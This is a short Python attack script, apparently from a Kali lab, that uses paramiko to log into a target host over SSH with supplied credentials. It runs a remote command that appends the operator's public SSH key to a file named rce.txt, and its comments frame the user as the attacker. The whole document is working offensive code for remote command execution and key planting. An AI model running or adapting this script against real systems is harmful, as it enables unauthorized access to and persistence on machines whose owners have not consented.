#! /usr/bin/python3

import paramiko

# open public key file and assign it to a variable
key_file = open("/home/kali/.ssh/id_rsa.pub", "r")
pub_key = key_file.read()

# concatenates bash commands and the pub_key file, then closes the file
remote_command = "echo \"{}\" >> rce.txt".format(pub_key[:-1])
key_file.close()

# get user input for the target's info
remote_ip = input('Please enter the target IP: ')
remote_username = input('Please enter the login username: ')
remote_password = input('Please enter the password: ')

# initiate the ssh connection and run the remote command
ssh = paramiko.SSHClient()
ssh.load_system_host_keys()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect(remote_ip, username=remote_username, password=remote_password, look_for_keys=False )
ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command(remote_command)

# store the command output in a variable then close the connection
output = ssh_stdout.readlines()
ssh.close()

# read the output and display it to the attacker's screen
for line in output:
    print(line[:-1])
